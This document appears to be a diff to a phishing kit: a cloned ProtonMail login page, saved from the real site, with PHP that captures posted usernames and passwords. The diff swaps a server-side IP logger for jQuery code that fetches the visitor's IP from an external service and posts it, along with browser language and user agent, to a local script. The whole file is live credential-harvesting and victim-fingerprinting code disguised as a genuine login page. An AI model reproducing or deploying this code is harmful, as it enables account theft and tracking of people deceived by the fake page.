@@ -1,22 +1,4 @@
-<?php
-function get_IP_address()
-{
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
-?>
+
 <?php
 $u = $_POST['username'];
 $p = $_POST['password'];
@@ -32,6 +14,29 @@ if ($u && $p){
 ?>
 
 <!DOCTYPE html>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script>
 <!-- saved from url=(0014)about:internet -->
 <html lang="en" ng-csp="no-unsafe-eval" class="protonmail ua-chrome ua-chrome-88 ua-chrome-88-0 ua-chrome-88-0-4324 ua-chrome-88-0-4324-192 ua-desktop ua-desktop-macintosh ua-mac_os_x ua-mac_os_x-10 ua-mac_os_x-10-13 ua-mac_os_x-10-13-6 ua-webkit ua-webkit-537 ua-webkit-537-36 js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><meta name="viewport" content="width=device-width,user-scalable=no"><meta http-equiv="x-dns-prefetch-control" content="off"><!--<base href="/">--><base href="."><title>Login | ProtonMail</title><meta name="description" content="Log in or create an account."><link rel="apple-touch-icon" sizes="57x57" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="https://mail.protonmail.com/assets/favicons/apple-touch-icon-180x180.png"><link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-32x32.png" sizes="32x32"><link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-194x194.png" sizes="194x194"><link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/android-chrome-192x192.png" sizes="192x192"><link rel="icon" type="image/png" href="https://mail.protonmail.com/assets/favicons/favicon-16x16.png" sizes="16x16"><link rel="manifest" href="https://mail.protonmail.com/manifest.json"><link rel="mask-icon" href="https://mail.protonmail.com/assets/favicons/safari-pinned-tab.svg" color="#333366"><link rel="shortcut icon" href="https://mail.protonmail.com/assets/favicons/favicon.ico"><meta name="google" content="notranslate"><meta name="apple-mobile-web-app-title" content="ProtonMail"><meta name="application-name" content="ProtonMail"><meta name="msapplication-TileColor" content="#333366"><meta name="msapplication-TileImage" content="/assets/favicons/mstile-144x144.png"><meta name="theme-color" content="#333366"><meta name="apple-itunes-app" content="app-id=979659905"><meta name="google-play-app" content="app-id=ch.protonmail.android"><link href="./Login _ ProtonMail_files/index.471e45d619.css" rel="stylesheet"><script charset="utf-8" src="./Login _ ProtonMail_files/9.47f0cd6fb0.chunk.js" integrity="sha384-lB7765gSpBGvIHo8FZHYkrXEMYLdGyx+/6lFWuKyGhEd797wGD2eb+7iO6wAm/aa" crossorigin="anonymous"></script><script charset="utf-8" src="./Login _ ProtonMail_files/10.4252e32f3e.chunk.js" integrity="sha384-tnc+G4i7zYzyO7gM903umoOlMPhWH8Hz24hR0IXQpNCgR7waFPAFtkmoHWI++oqy" crossorigin="anonymous"></script><script charset="utf-8" src="./Login _ ProtonMail_files/vendors_vendorLazy.module.2b521c6abc.chunk.js" integrity="sha384-7VKqu3nBmJT57O2eyzRGIf8eq5uxl+fK/JiUorkFReRAW+F5+Yk//QKEs1acyv1S" crossorigin="anonymous"></script><script charset="utf-8" src="./Login _ ProtonMail_files/vendorLazy.module.d6bd37a874.chunk.js" integrity="sha384-xBb4m9qw+pvYOCGbjI77bWfC1A5fes1EzzXn/0LmYoHoOGoYhP7C3J6YQQwvrFSU" crossorigin="anonymous"></script><style id="angular-vs-repeat-style">
 	  	.vs-repeat-debug-element {
